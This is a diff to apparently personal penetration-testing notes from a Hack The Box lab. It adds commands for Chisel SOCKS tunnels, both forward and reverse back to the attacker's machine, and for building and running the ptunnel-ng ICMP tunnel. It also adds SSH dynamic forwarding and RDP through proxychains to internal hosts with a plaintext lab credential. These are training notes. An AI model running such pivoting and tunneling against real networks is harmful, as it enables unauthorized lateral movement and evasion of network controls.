@@ -86,5 +86,29 @@ Dnscat2:
 
 
 Chisel:
-  
+    scp
+    chmod +x chisel
+
+    ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
+    mattchow@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks
+    proxychains xfreerdp /v:DCIP /u:victor /p:pass@123
+
+    mattchow@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
+    ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
+    proxychains xfreerdp /v:DCIP /u:victor /p:pass@123
+
     https://github.com/jpillora/chisel
+
+
+ICMP:
+  sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
+  ./autogen.sh
+
+  scp -r ptunnel-ng ubuntu@STMIP
+  ubuntu@WEB01:~$ sudo ./ptunnel-ng/src/ptunnel-ng -r10.129.151.105 -R22
+  sudo ./ptunnel-ng/src/ptunnel-ng -p10.129.151.105 -l2222 -r10.129.151.105 -R22
+
+  ssh -D 9050 -p2222 -lubuntu 127.0.0.1
+  proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 /dynamic-resolution
+
+    https://github.com/utoni/ptunnel-ng
